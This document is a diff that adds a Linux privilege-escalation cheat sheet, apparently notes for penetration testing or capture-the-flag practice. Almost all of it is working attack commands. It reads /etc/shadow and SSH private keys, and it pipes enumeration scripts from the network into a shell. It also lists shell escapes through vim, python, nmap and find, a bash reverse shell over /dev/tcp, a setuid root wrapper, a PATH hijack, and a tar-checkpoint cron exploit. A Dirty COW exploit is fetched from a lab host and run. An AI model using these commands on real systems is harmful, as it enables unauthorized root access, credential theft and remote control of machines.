@@ -1,0 +1,98 @@
+🔍 System Information:
+hostname
+uname -a
+uname -r
+cat /proc/version
+lscpu
+
+📋 OS Version:
+cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release
+cat /etc/redhat-release
+lsb_release -a
+
+👤 User & Privileges:
+id
+whoami
+sudo -l
+cat /etc/passwd
+cat /etc/shadow     # Requires root
+cat /etc/group
+
+🔑 SSH Keys & Auth:
+ls -l ~/.ssh
+find / -name "authorized_keys" 2>/dev/null
+find / -name "id_rsa" 2>/dev/null
+chmod 600 id_rsa
+ssh -i id_rsa root@<IP>
+
+🧩 Running Processes:
+ps aux
+ps aux | grep root
+
+📁 Directory & File Enumeration:
+ls -la /root
+ls -la /home
+ls -la /var/backups /tmp /home/* /root
+ls -la .*history
+ls -l /usr/local/bin/overwrite.sh
+
+🔐 SUID, SGID, Sticky Bit:
+find / -perm -4000 -type f 2>/dev/null          # SUID
+find / -perm -2000 -type f 2>/dev/null          # SGID
+find / -perm -1000 -type d 2>/dev/null          # Sticky bit
+find / -perm -u=s -type f 2>/dev/null
+find / -type f -perm -04000 -ls 2>/dev/null
+find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null
+
+🧠 Automation & Enumeration Tools:
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+wget -q https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O - | bash
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh
+
+⏱️ Scheduled Jobs:
+cat /etc/crontab
+crontab -l
+ls -la /etc/cron.daily/
+
+⚠️ Writable Files & Directories:
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
+
+📦 Capabilities:
+getcap -r / 2>/dev/null
+
+🧪 Common Exploits & Exploit Attempts:
+vim -c ':!sh'
+vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+vim --cmd ':set shell=/bin/sh|:shell'
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import os; os.system("/bin/sh -p")'
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+echo "os.execute('/bin/sh')" > /tmp/shell.nse
+sudo nmap --script=/tmp/shell.nse
+
+find . -exec /bin/sh \; -quit
+sudo find . -exec /bin/sh \; -quit
+
+bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+
+echo 'int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+gcc /tmp/service.c -o /tmp/service
+
+🧩 Exploiting PATH:
+cd /tmp && echo "/bin/bash" > cat && chmod +x cat && ./cat
+
+🧪 Cron Exploit Example:
+echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /home/user/runme.sh
+chmod +x /home/user/runme.sh
+touch /home/user/ --checkpoint=1
+touch /home/user/ --checkpoint-action=exec=sh\ runme.sh
+
+curl http://10.10.14.1:8000/dirtycow -o /tmp/dc && chmod +x /tmp/dc && /tmp/dc
+wget http://10.10.14.1:8000/dirtycow -O /tmp/dc && chmod +x /tmp/dc && /tmp/dc
+cd /tmp && git clone https://github.com/firefart/dirtycow.git && cd dirtycow && gcc -pthread dirty.c -o dc -lcrypt && ./dc
+
